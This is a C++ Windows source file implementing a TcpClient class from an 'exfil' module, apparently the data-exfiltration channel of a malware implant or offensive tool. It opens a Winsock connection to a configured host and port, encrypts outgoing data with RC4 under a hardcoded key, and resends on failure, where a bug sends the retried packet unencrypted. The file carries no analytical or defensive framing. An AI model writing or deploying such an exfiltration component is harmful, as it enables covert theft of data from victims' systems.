#include "exfil/tcp_client.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#include "crypto/rc4.hpp"

#pragma comment(lib, "ws2_32.lib")

TcpClient::TcpClient(const std::string& ipAddress, int port) : ip(ipAddress), port(port) {
    sock = INVALID_SOCKET;
    isConnected = false;
    encryption = nullptr;
    
    // Key: DEADBEEF...
    key = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
}

TcpClient::~TcpClient() {
    if(sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if(encryption) delete (RC4*)encryption;
    WSACleanup();
}

bool TcpClient::Connect() {
    if(sock != INVALID_SOCKET) {
        closesocket(sock);
        sock = INVALID_SOCKET;
    }
    
    // Reset Encryption 
    if(encryption) delete (RC4*)encryption;
    encryption = new RC4(key);

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if(getaddrinfo(ip.c_str(), std::to_string(port).c_str(), &hints, &res) != 0) return false;

    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) {
        freeaddrinfo(res);
        return false;
    }

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        closesocket(sock);
        sock = INVALID_SOCKET;
        freeaddrinfo(res);
        return false;
    }

    freeaddrinfo(res);
    isConnected = true;
    return true;
}

bool TcpClient::SendData(const std::string& data) {
    // 1. If not connected, try to connect
    if (!isConnected) {
        if (!Connect()) return false;
    }

    // 2. Encrypt & Send
    std::string packet = data + "\n";
    std::string cipher = ((RC4*)encryption)->Encrypt(packet);
    
    int sent = send(sock, cipher.c_str(), cipher.length(), 0);

    // 3. Handle Failure (Broken Pipe usually)
    if (sent == SOCKET_ERROR) {
        isConnected = false;
        
        // Retry ONCE
        if(Connect()) {
            send(sock, packet.c_str(), packet.length(), 0);
            return true;
        }
        return false;
    }

    return true;
}
